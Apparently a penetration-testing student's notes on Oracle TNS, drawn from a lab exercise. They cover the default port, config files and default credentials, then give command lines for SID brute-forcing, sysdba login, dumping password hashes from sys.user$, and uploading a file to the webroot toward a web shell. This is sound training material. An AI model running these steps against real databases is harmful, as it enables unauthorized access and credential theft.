- The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.
-  Its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.

# Default Configuration
---
- By default, the listener listens for incoming connections on the **TCP/1521 port.**
- The configuration files for Oracle TNS are ==**called `tnsnames.ora` and `listener.ora==`** and are typically located in the ==**`$ORACLE_HOME/network/admin` directory.**==
- Oracle 9 has a ==**default password, CHANGE_ON_INSTALL,**== whereas Oracle 10 has no default password set.
-  The **Oracle ==DBSNMP service also uses a default password, dbsnmp**== that we should remember when we come across this one.
- Another example would be that many organizations still use the `finger` service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.

- Each database has unique `tnsnames.ora` file, containing the necessary information for clients to connect to the service:
	- ![[Pasted image 20250617062050.png]]
- Here we can see a service called `ORCL`, which is listening on port `TCP/1521` on the IP address `10.129.11.102`. Clients should use the service name `orcl` when connecting to the service.

- On the other hand, the **`listener.ora` file is a server-side configuration file** that defines the listener **process's properties and parameters** which is responsible for receiving incoming client requests
	- ![[Pasted image 20250617062204.png]]

- Oracle databases can be protected by using so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory, and it contains the names of PL/SQL packages or types that should be excluded from execution.

# ODAT
---
- Oracle Database Attacking Tool (ODAT) is an **==open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases.==** 
- `./odat.py -h`

# Footprinting
---
- `nmap -p1521 -sV 10.129.204.235 --open`

- In Oracle RDBMS, **a System Identifier (SID) is a unique name that identifies a particular database** instance. It can have multiple instances, each with its own System ID. 
- When a **client** connects to an Oracle database, it **specifies the database's `SID`** along **with its** **connection string**. The client uses this SID to identify which database instance it wants to connect to. 
- Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is used.

# Bruteforcing SID
---
- `nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute`
- We can use the odat.py tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. :
	- `./odat.py all -s 10.129.204.235`

# Connection
---
- `sqlplus scott/tiger@10.129.204.235/XE`
	- If you come across the following error **`sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).**:
		- `sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig`

- `select table_name from all_tables;`
- `select * from user_role_privs;`

- Here, the user scott has no administrative privileges. However, **==we can try using this account to log in as the System Database Admin (sysdba), giving us higher privileges.==** 
- This is possible when the user scott has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.:
	- `sqlplus scott/tiger@10.129.204.235/XE as sysdba`

# Oracle RDBMS - Database Enumeration
---
-  From this point, **==we could retrieve the password hashes from the sys.user$==** and try to crack them offline. The query for this would look like the following:
- `select name, password from sys.user$;`


# Shell
---
- Another option is to **==upload a web shell to the target.==** However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver:
	- ![[Pasted image 20250617063607.png]]

# File Upload
---
- `./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt`
- `curl -X GET http://10.129.204.235/testing.txt`